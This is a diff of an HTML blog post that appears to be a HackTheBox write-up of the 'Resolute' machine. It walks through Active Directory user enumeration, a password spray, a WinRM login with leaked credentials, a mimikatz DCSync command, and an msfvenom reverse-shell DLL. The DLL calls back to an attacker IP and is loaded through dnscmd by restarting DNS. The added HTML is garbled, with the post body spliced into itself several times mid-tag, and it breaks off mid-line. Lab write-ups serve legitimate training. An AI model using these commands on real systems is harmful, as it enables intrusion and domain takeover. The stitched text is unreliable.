@@ -1,2 +1,414 @@
-<html><head><meta charset="utf-8"></head><body><p>We can use rpc client to get usernames</p><p><code>user:[Administrator] rid:[0x1f4]&nbsp;</code><br><code>user:[Guest] rid:[0x1f5]</code><br><code>user:[krbtgt] rid:[0x1f6]</code><br><code>user:[DefaultAccount] rid:[0x1f7]</code><br><code>user:[ryan] rid:[0x451]</code><br><code>user:[marko] rid:[0x457]</code><br><code>user:[sunita] rid:[0x19c9]</code><br><code>user:[abigail] rid:[0x19ca]</code><br><code>user:[marcus] rid:[0x19cb]</code><br><code>user:[sally] rid:[0x19cc]</code><br><code>user:[fred] rid:[0x19cd]</code><br><code>user:[angela] rid:[0x19ce]</code><br><code>user:[felicia] rid:[0x19cf]</code><br><code>user:[gustavo] rid:[0x19d0]</code><br><code>user:[ulf] rid:[0x19d1]</code><br><code>user:[stevie] rid:[0x19d2]</code><br><code>user:[claire] rid:[0x19d3]</code><br><code>user:[paulo] rid:[0x19d4]</code><br><code>user:[steve] rid:[0x19d5]</code><br><code>user:[annette] rid:[0x19d6]</code><br><code>user:[annika] rid:[0x19d7]</code><br><code>user:[per] rid:[0x19d8]</code><br><code>user:[claude] rid:[0x19d9]</code><br><code>user:[melanie] rid:[0x2775]</code><br><code>user:[zach] rid:[0x2776]</code><br><code>user:[simon] rid:[0x2777]</code><br><code>user:[naoki] rid:[0x2778]</code><br>&nbsp;</p><p>And groups</p><p><code>rpcclient $&gt; enumdomgroups</code><br><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</code><br><code>group:[Domain Admins] rid:[0x200]</code><br><code>group:[Domain Users] rid:[0x201]</code><br><code>group:[Domain Guests] rid:[0x202]</code><br><code>group:[Domain Computers] rid:[0x203]</code><br><code>group:[Domain Controllers] rid:[0x204]</code><br><code>group:[Schema Admins] rid:[0x206]</code><br><code>group:[Enterprise Admins] rid:[0x207]</code><br><code>group:[Group Policy Creator Owners] rid:[0x208]</code><br><code>group:[Read-only Domain Controllers] rid:[0x209]</code><br><code>group:[Cloneable Domain Controllers] rid:[0x20a]</code><br><code>group:[Protected Users] rid:[0x20d]</code><br><code>group:[Key Admins] rid:[0x20e]</code><br><code>group:[Enterprise Key Admins] rid:[0x20f]</code><br><code>group:[DnsUpdateProxy] rid:[0x44e]</code><br><code>group:[Contractors] rid:[0x44f]</code><br>&nbsp;</p><p>Running enum4linux we get this</p><p>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko&nbsp;&nbsp;&nbsp;&nbsp;Name: Marko Novak&nbsp;&nbsp;&nbsp;&nbsp;Desc: Account created. Password set to Welcome123!</p><p>&nbsp;</p><p>index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan&nbsp;&nbsp;&nbsp;&nbsp;Name: Ryan Bertrand&nbsp;&nbsp;&nbsp;&nbsp;Desc: (null)<br>&nbsp;</p><p>Every other user is set to null for names so I imagine these are the two actual users. Marko login does not work unforutnately.</p><p>&nbsp;</p><p>Minimum password length: 7</p><p>Account Lockout Threshold: None - Accounts will not get locked out</p><p>&nbsp;</p><p>Ryan is in a special group</p><p>'Contractors' (RID: 1103) has member: MEGABANK\ryan<br>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Password Spray</u></strong></span></p><p>Using egrep I pulled all passwords from rockyou.txt that are a minimum of 7 characters and moved them to a new wordlist to attempt a password spray</p><p><code>egrep '.{7,}' /usr/share/wordlists/rockyou.txt &gt; rockyou.txt</code></p><p>then ran it against ryan and marko</p><p><code>crackmapexec smb 10.10.10.169 -u newusers.txt -p rockyou.txt | grep +</code></p><p>&nbsp;</p><p>Didnt get anything with the spray.</p><p>&nbsp;</p><p>Looking back at marko his password hasnt changed so we should be able to use Welcome123!</p><p>rpcclient $&gt; queryuser 0x457<br>&nbsp;&nbsp;&nbsp;&nbsp;User Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;marko<br>&nbsp;&nbsp;&nbsp;&nbsp;Full Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Marko Novak<br>&nbsp;&nbsp;&nbsp;&nbsp;Home Drive &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Dir Drive &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Profile Path:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Script:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Description :&nbsp;&nbsp;&nbsp;&nbsp;Account created. Password set to Welcome123!<br>&nbsp;&nbsp;&nbsp;&nbsp;Workstations:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Comment &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Remote Dial :<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Logoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Kickoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password last set Time &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Fri, 27 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password can change Time :&nbsp;&nbsp;&nbsp;&nbsp;Sat, 28 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password must change Time:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT</p><p>&nbsp;</p><p>Before this I ran this with the domain name megabank.local instead of the IP and it failed. I used guided mode and saw password spraying was the proper path so I tried the IP and it worked. Simple mistake on my end.</p><figure class="image"><img style="aspect-ratio:1272/453;" src="../img/posts/2024-05-24-Resolute(HTB)/01-56bdeef38a.png" width="1272" height="453"></figure><p>&nbsp;</p><p>melanie:Welcome123!</p><p>&nbsp;</p><p>We can remote in with evil-winrm</p><p>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Bloodhound</u></strong></span></p><p>After taking a while to get bloodhound working I used bloodhound.py and I was finally able to get working data.</p><p>&nbsp;</p><p>This is our path to Admin</p><figure class="image image-style-block-align-left image_resized" style="width:60.55%;"><img style="aspect-ratio:1039/1101;" src="../img/posts/2024-05-24-Resolute(HTB)/02-b498e12538.png" width="1039" height="1101"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can PS remote into Resolute</p><p>&nbsp;</p><pre><code class="language-text-plain">$SecPassword = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('MEGABANK.LOCAL\melanie', $SecPassword)</code></pre><p><code>$session = New-PSSession -ComputerName RESOLUTE.MEGABANK.LOCAL -Credential $Cred</code></p><p><code>Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}</code></p><p>&nbsp;</p><p>Confirm it worked with <code>Get-ChildItem Env:</code> we see the computer name is Resolute</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:547/203;" src="../img/posts/2024-05-24-Resolute(HTB)/03-8372d509e9.png" width="547" height="203"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Next we can perform a DCSync attack with mimikatz</p><p>&nbsp;</p><p><code>lsadump::dcsync /domain:MEGABANK.LOCAL /user:Administrator</code><br>&nbsp;</p><p>I tried to get mimikatz on the machine by making mimikatz undetected, disabling av, nothing is working. I realized we have another user, Ryan.&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I tried doing everything I could imagine to find creds for Ryan but had no luck. I decided to look up a guide. The files were hidden inside a hidden directory hiding everything inside the directory as well.<br><br>Using ls -force we can find the hidden folders in the root of the C drive.</p><p>&nbsp;</p><p>C:\PStranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p><p>&nbsp;</p><p>In the history file we find creds for ryan</p><p>ryan Serv3r4Admin4cc123!<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Getting a hint from guided mode after searching for a couple hours and finding nothing the attack vector is the DNS Admin group. I saw this when I ran whoami /all but forgot after going out to dinner and coming back.</p><p>&nbsp;</p><p>DNS admin group can set a DLL file to run when DNS starts. We create a dll using msfvenom</p><p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f dll -o rev.dll</code></p><p><br>I tried uploading the dll but defender blocks it. Thankfully we can actually run this from our smbshare without uploading it. For some reason if you map the drive though it will not work and you will not get a shell(this took me a very long time to figure out)</p><p>&nbsp;</p><p>Setting the malcious DLL(Do not map the drive or it fails)</p><p><code>dnscmd.exe /config /serverlevelplugindll \\10.10.14.22\s\rev.dll</code></p><p>&nbsp;</p><p>Stop and Start DNS</p><p><code>sc.exe \\resolute stop dns</code><br><code>sc.exe \\resolute start dns</code><br>&nbsp;</p><p>And we get a reverse shell</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:532/222;" src="../img/posts/2024-05-24-Resolute(HTB)/04-b097ccf123.png" width="532" height="222"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></body></html>
+<html><head><meta charset="utf-8">
+    <title>HTB: Resolute | HackWithJordan</title><style>
+        :root {
+            --bg: #0b0e14;
+            --accent: #5eead4;
+            --violet: #7c8cf8;
+            --text: #e8edf2;
+            --muted: #8b97a6;
+            --surface: rgba(255, 255, 255, .04);
+            --border: rgba(255, 255, 255, .09);
+            --accent-dim: rgba(94, 234, 212, .14);
+            --border-hover: rgba(94, 234, 212, .45);
+            --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --mono: 'Cascadia Code', 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            line-height: 1.65;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        ::selection {
+            background: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        #bg-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(110px);
+            opacity: .5;
+            z-index: 0;
+            pointer-events: none;
+            will-change: transform;
+        }
+
+        .blob-1 {
+            width: 55vw;
+            height: 55vw;
+            top: -20vw;
+            left: -15vw;
+            background: radial-gradient(circle, rgba(94, 234, 212, .16), transparent 70%);
+            animation: drift1 26s ease-in-out infinite alternate;
+        }
+
+        .blob-2 {
+            width: 48vw;
+            height: 48vw;
+            bottom: -18vw;
+            right: -12vw;
+            background: radial-gradient(circle, rgba(124, 140, 248, .16), transparent 70%);
+            animation: drift2 32s ease-in-out infinite alternate;
+        }
+
+        .blob-3 {
+            width: 34vw;
+            height: 34vw;
+            top: 40%;
+            left: 55%;
+            background: radial-gradient(circle, rgba(94, 234, 212, .10), transparent 70%);
+            animation: drift3 22s ease-in-out infinite alternate;
+        }
+
+        @keyframes drift1 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(6vw, 4vw) scale(1.15); }
+        }
+
+        @keyframes drift2 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-5vw, -6vw) scale(1.1); }
+        }
+
+        @keyframes drift3 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-4vw, 5vw) scale(.9); }
+        }
+
+        article.post {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 96px 28px 80px;
+        }
+
+        .post-header {
+            border-bottom: 2px solid var(--violet);
+            padding-bottom: 18px;
+            margin-bottom: 36px;
+        }
+
+        .post-header h1 {
+            font-size: 2.1rem;
+            line-height: 1.2;
+            color: var(--violet);
+            font-weight: 700;
+            letter-spacing: -0.01em;
+        }
+
+        .post-header .post-meta {
+            color: var(--muted);
+            font-size: 0.95rem;
+            margin-top: 8px;
+            font-family: var(--mono);
+            letter-spacing: 0.3px;
+        }
+
+        .post h1 {
+            color: var(--violet);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 44px 0 14px;
+        }
+
+        .post h2 {
+            color: var(--violet);
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin: 36px 0 12px;
+        }
+
+        .post h3 {
+            color: var(--violet);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 28px 0 10px;
+        }
+
+        .post p {
+            margin: 15px 0;
+        }
+
+        .post a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .post a:hover {
+            text-decoration: underline;
+        }
+
+        .post img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .post figure {
+            margin: 20px 0;
+        }
+
+        .post pre.terminal {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: var(--mono);
+            font-size: 0.88rem;
+            line-height: 1.55;
+            margin: 18px 0;
+            color: var(--text);
+        }
+
+        .post code {
+            font-family: var(--mono);
+            font-size: 0.9em;
+            background: var(--surface);
+            padding: 2px 6px;
+            border-radius: 4px;
+            overflow-wrap: anywhere;
+        }
+
+        .post pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .post ul,
+        .post ol {
+            margin: 15px 0 15px 24px;
+        }
+
+        .post li {
+            margin: 6px 0;
+        }
+
+        .post hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 32px 0;
+        }
+
+        .post table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 18px 0;
+            font-size: 0.95rem;
+        }
+
+        .post th,
+        .post td {
+            border: 1px solid var(--border);
+            padding: 8px 12px;
+            text-align: left;
+        }
+
+        .post th {
+            background: var(--surface);
+            color: var(--violet);
+        }
+
+        @media (max-width: 640px) {
+            article.post {
+                padding: 72px 20px 60px;
+            }
+
+            .post-header h1 {
+                font-size: 1.7rem;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .blob {
+                animation: none;
+            }
+        }
+    
+        .home-btn {
+            position: fixed;
+            top: 24px;
+            right: 28px;
+            z-index: 5;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            color: var(--muted);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 7px 14px;
+            text-decoration: none;
+            transition: color 0.2s ease, border-color 0.2s ease;
+        }
+        .home-btn:hover {
+            color: var(--accent);
+            border-color: var(--border-hover);
+        }
+</style>
+</head><body>
+    <a class="home-btn" href="../" title="Back to home">~$ cd ~</a>
+    <canvas id="bg-canvas"></canvas>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+
+    <article class="post">
+        <header class="post-header">
+            <h1>HTB: Resolute</h1>
+            <div class="post-meta">May 24, 2024 &bull; HTB</div>
+        </header>
+
+<p>We can use rpc client to get usernames</p><p><code>user:[Administrator] rid:[0x1f4]&nbsp;</code><br><code>user:[Guest] rid:[0x1f5]</code><br><code>user:[krbtgt] rid:[0x1f6]</code><br><code>user:[DefaultAccount] rid:[0x1f7]</code><br><code>user:[ryan] rid:[0x451]</code><br><code>user:[marko] rid:[0x457]</code><br><code>user:[sunita] rid:[0x19c9]</code><br><code>user:[abigail] rid:[0x19ca]</code><br><code>user:[marcus] rid:[0x19cb]</code><br><code>user:[sally] rid:[0x19cc]</code><br><code>user:[fred] rid:[0x19cd]</code><br><code>user:[angela] rid:[0x19ce]</code><br><code>user:[felicia] rid:[0x19cf]</code><br><code>user:[gustavo] rid:[0x19d0]</code><br><code>user:[ulf] rid:[0x19d1]</code><br><code>user:[stevie] rid:[0x19d2]</code><br><code>user:[claire] rid:[0x19d3]</code><br><code>user:[paulo] rid:[0x19d4]</code><br><code>user:[steve] rid:[0x19d5]</code><br><code>user:[annette] rid:[0x19d6]</code><br><code>user:[annika] rid:[0x19d7]</code><br><code>user:[per] rid:[0x19d8]</code><br><code>user:[claude] rid:[0x19d9]</code><br><code>user:[melanie] rid:[0x2775]</code><br><code>user:[zach] rid:[0x2776]</code><br><code>user:[simon] rid:[0x2777]</code><br><code>user:[naoki] rid:[0x2778]</code><br>&nbsp;</p><p>And groups</p><p><code>rpcclient <body><p>We can use rpc client to get usernames</p><p><code>user:[Administrator] rid:[0x1f4]&nbsp;</code><br><code>user:[Guest] rid:[0x1f5]</code><br><code>user:[krbtgt] rid:[0x1f6]</code><br><code>user:[DefaultAccount] rid:[0x1f7]</code><br><code>user:[ryan] rid:[0x451]</code><br><code>user:[marko] rid:[0x457]</code><br><code>user:[sunita] rid:[0x19c9]</code><br><code>user:[abigail] rid:[0x19ca]</code><br><code>user:[marcus] rid:[0x19cb]</code><br><code>user:[sally] rid:[0x19cc]</code><br><code>user:[fred] rid:[0x19cd]</code><br><code>user:[angela] rid:[0x19ce]</code><br><code>user:[felicia] rid:[0x19cf]</code><br><code>user:[gustavo] rid:[0x19d0]</code><br><code>user:[ulf] rid:[0x19d1]</code><br><code>user:[stevie] rid:[0x19d2]</code><br><code>user:[claire] rid:[0x19d3]</code><br><code>user:[paulo] rid:[0x19d4]</code><br><code>user:[steve] rid:[0x19d5]</code><br><code>user:[annette] rid:[0x19d6]</code><br><code>user:[annika] rid:[0x19d7]</code><br><code>user:[per] rid:[0x19d8]</code><br><code>user:[claude] rid:[0x19d9]</code><br><code>user:[melanie] rid:[0x2775]</code><br><code>user:[zach] rid:[0x2776]</code><br><code>user:[simon] rid:[0x2777]</code><br><code>user:[naoki] rid:[0x2778]</code><br>&nbsp;</p><p>And groups</p><p><code>rpcclient $&gt; enumdomgroups</code><br><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</code><br><code>group:[Domain Admins] rid:[0x200]</code><br><code>group:[Domain Users] rid:[0x201]</code><br><code>group:[Domain Guests] rid:[0x202]</code><br><code>group:[Domain Computers] rid:[0x203]</code><br><code>group:[Domain Controllers] rid:[0x204]</code><br><code>group:[Schema Admins] rid:[0x206]</code><br><code>group:[Enterprise Admins] rid:[0x207]</code><br><code>group:[Group Policy Creator Owners] rid:[0x208]</code><br><code>group:[Read-only Domain Controllers] rid:[0x209]</code><br><code>group:[Cloneable Domain Controllers] rid:[0x20a]</code><br><code>group:[Protected Users] rid:[0x20d]</code><br><code>group:[Key Admins] rid:[0x20e]</code><br><code>group:[Enterprise Key Admins] rid:[0x20f]</code><br><code>group:[DnsUpdateProxy] rid:[0x44e]</code><br><code>group:[Contractors] rid:[0x44f]</code><br>&nbsp;</p><p>Running enum4linux we get this</p><p>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko&nbsp;&nbsp;&nbsp;&nbsp;Name: Marko Novak&nbsp;&nbsp;&nbsp;&nbsp;Desc: Account created. Password set to Welcome123!</p><p>&nbsp;</p><p>index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan&nbsp;&nbsp;&nbsp;&nbsp;Name: Ryan Bertrand&nbsp;&nbsp;&nbsp;&nbsp;Desc: (null)<br>&nbsp;</p><p>Every other user is set to null for names so I imagine these are the two actual users. Marko login does not work unforutnately.</p><p>&nbsp;</p><p>Minimum password length: 7</p><p>Account Lockout Threshold: None - Accounts will not get locked out</p><p>&nbsp;</p><p>Ryan is in a special group</p><p>'Contractors' (RID: 1103) has member: MEGABANK\ryan<br>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Password Spray</u></strong></span></p><p>Using egrep I pulled all passwords from rockyou.txt that are a minimum of 7 characters and moved them to a new wordlist to attempt a password spray</p><p><code>egrep '.{7,}' /usr/share/wordlists/rockyou.txt &gt; rockyou.txt</code></p><p>then ran it against ryan and marko</p><p><code>crackmapexec smb 10.10.10.169 -u newusers.txt -p rockyou.txt | grep +</code></p><p>&nbsp;</p><p>Didnt get anything with the spray.</p><p>&nbsp;</p><p>Looking back at marko his password hasnt changed so we should be able to use Welcome123!</p><p>rpcclient $&gt; queryuser 0x457<br>&nbsp;&nbsp;&nbsp;&nbsp;User Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;marko<br>&nbsp;&nbsp;&nbsp;&nbsp;Full Name &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Marko Novak<br>&nbsp;&nbsp;&nbsp;&nbsp;Home Drive &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Dir Drive &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Profile Path:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Script:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Description :&nbsp;&nbsp;&nbsp;&nbsp;Account created. Password set to Welcome123!<br>&nbsp;&nbsp;&nbsp;&nbsp;Workstations:&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Comment &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;Remote Dial :<br>&nbsp;&nbsp;&nbsp;&nbsp;Logon Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Logoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 31 Dec 1969 19:00:00 EST<br>&nbsp;&nbsp;&nbsp;&nbsp;Kickoff Time &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password last set Time &nbsp; :&nbsp;&nbsp;&nbsp;&nbsp;Fri, 27 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password can change Time :&nbsp;&nbsp;&nbsp;&nbsp;Sat, 28 Sep 2019 09:17:15 EDT<br>&nbsp;&nbsp;&nbsp;&nbsp;Password must change Time:&nbsp;&nbsp;&nbsp;&nbsp;Wed, 13 Sep 30828 22:48:05 EDT</p><p>&nbsp;</p><p>Before this I ran this with the domain name megabank.local instead of the IP and it failed. I used guided mode and saw password spraying was the proper path so I tried the IP and it worked. Simple mistake on my end.</p><figure class="image"><img style="aspect-ratio:1272/453;" src="../img/posts/2024-05-24-Resolute(HTB)/01-56bdeef38a.png" width="1272" height="453"></figure><p>&nbsp;</p><p>melanie:Welcome123!</p><p>&nbsp;</p><p>We can remote in with evil-winrm</p><p>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Bloodhound</u></strong></span></p><p>After taking a while to get bloodhound working I used bloodhound.py and I was finally able to get working data.</p><p>&nbsp;</p><p>This is our path to Admin</p><figure class="image image-style-block-align-left image_resized" style="width:60.55%;"><img style="aspect-ratio:1039/1101;" src="../img/posts/2024-05-24-Resolute(HTB)/02-b498e12538.png" width="1039" height="1101"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can PS remote into Resolute</p><p>&nbsp;</p><pre><code class="language-text-plain">$SecPassword = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('MEGABANK.LOCAL\melanie', $SecPassword)</code></pre><p><code>$session = New-PSSession -ComputerName RESOLUTE.MEGABANK.LOCAL -Credential $Cred</code></p><p><code>Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}</code></p><p>&nbsp;</p><p>Confirm it worked with <code>Get-ChildItem Env:</code> we see the computer name is Resolute</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:547/203;" src="../img/posts/2024-05-24-Resolute(HTB)/03-8372d509e9.png" width="547" height="203"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Next we can perform a DCSync attack with mimikatz</p><p>&nbsp;</p><p><code>lsadump::dcsync /domain:MEGABANK.LOCAL /user:Administrator</code><br>&nbsp;</p><p>I tried to get mimikatz on the machine by making mimikatz undetected, disabling av, nothing is working. I realized we have another user, Ryan.&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I tried doing everything I could imagine to find creds for Ryan but had no luck. I decided to look up a guide. The files were hidden inside a hidden directory hiding everything inside the directory as well.<br><br>Using ls -force we can find the hidden folders in the root of the C drive.</p><p>&nbsp;</p><p>C:\PStranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p><p>&nbsp;</p><p>In the history file we find creds for ryan</p><p>ryan Serv3r4Admin4cc123!<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Getting a hint from guided mode after searching for a couple hours and finding nothing the attack vector is the DNS Admin group. I saw this when I ran whoami /all but forgot after going out to dinner and coming back.</p><p>&nbsp;</p><p>DNS admin group can set a DLL file to run when DNS starts. We create a dll using msfvenom</p><p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f dll -o rev.dll</code></p><p><br>I tried uploading the dll but defender blocks it. Thankfully we can actually run this from our smbshare without uploading it. For some reason if you map the drive though it will not work and you will not get a shell(this took me a very long time to figure out)</p><p>&nbsp;</p><p>Setting the malcious DLL(Do not map the drive or it fails)</p><p><code>dnscmd.exe /config /serverlevelplugindll \\10.10.14.22\s\rev.dll</code></p><p>&nbsp;</p><p>Stop and Start DNS</p><p><code>sc.exe \\resolute stop dns</code><br><code>sc.exe \\resolute start dns</code><br>&nbsp;</p><p>And we get a reverse shell</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:532/222;" src="../img/posts/2024-05-24-Resolute(HTB)/04-b097ccf123.png" width="532" height="222"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></body>gt; enumdomgroups</code><br><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</code><br><code>group:[Domain Admins] rid:[0x200]</code><br><code>group:[Domain Users] rid:[0x201]</code><br><code>group:[Domain Guests] rid:[0x202]</code><br><code>group:[Domain Computers] rid:[0x203]</code><br><code>group:[Domain Controllers] rid:[0x204]</code><br><code>group:[Schema Admins] rid:[0x206]</code><br><code>group:[Enterprise Admins] rid:[0x207]</code><br><code>group:[Group Policy Creator Owners] rid:[0x208]</code><br><code>group:[Read-only Domain Controllers] rid:[0x209]</code><br><code>group:[Cloneable Domain Controllers] rid:[0x20a]</code><br><code>group:[Protected Users] rid:[0x20d]</code><br><code>group:[Key Admins] rid:[0x20e]</code><br><code>group:[Enterprise Key Admins] rid:[0x20f]</code><br><code>group:[DnsUpdateProxy] rid:[0x44e]</code><br><code>group:[Contractors] rid:[0x44f]</code><br>&nbsp;</p><p>Running enum4linux we get this</p><p>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko&nbsp;&nbsp;&nbsp;&nbsp;Name: Marko Novak&nbsp;&nbsp;&nbsp;&nbsp;Desc: Account created. Password set to Welcome123!</p><p>&nbsp;</p><p>index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan&nbsp;&nbsp;&nbsp;&nbsp;Name: Ryan Bertrand&nbsp;&nbsp;&nbsp;&nbsp;Desc: (null)<br>&nbsp;</p><p>Every other user is set to null for names so I imagine these are the two actual users. Marko login does not work unforutnately.</p><p>&nbsp;</p><p>Minimum password length: 7</p><p>Account Lockout Threshold: None - Accounts will not get locked out</p><p>&nbsp;</p><p>Ryan is in a special group</p><p>'Contractors' (RID: 1103) has member: MEGABANK\ryan<br>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge"><strong><u>Password Spray</u></strong></span></p><p>Using egrep I pulled all passwords from rockyou.txt that are a minimum of 7 characters and moved them to a new wordlist to attempt a password spray</p><p><code>egrep '.{7,}' /usr/share/wordlists/rockyou.txt &gt; rockyou.txt</code></p><p>then ran it against ryan and marko</p><p><code>crackmapexec smb 10.10.10.169 -u newusers.txt -p rockyou.txt | grep +</code></p><p>&nbsp;</p><p>Didnt get anything with the spray.</p><p>&nbsp;</p><p>Looking back at marko his password hasnt changed so we should be able to use Welcome123!</p><p>rpcclient <body><p>We can use rpc client to get usernames</p><p><code>user:[Administrator] rid:[0x1f4]&nbsp;</code><br><code>user:[Guest] rid:[0x1f5]</code><br><code>user:[krbtgt] rid:[0x1f6]</code><br><code>user:[DefaultAccount] rid:[0x1f7]</code><br><code>user:[ryan] rid:[0x451]</code><br><code>user:[marko] rid:[0x457]</code><br><code>user:[sunita] 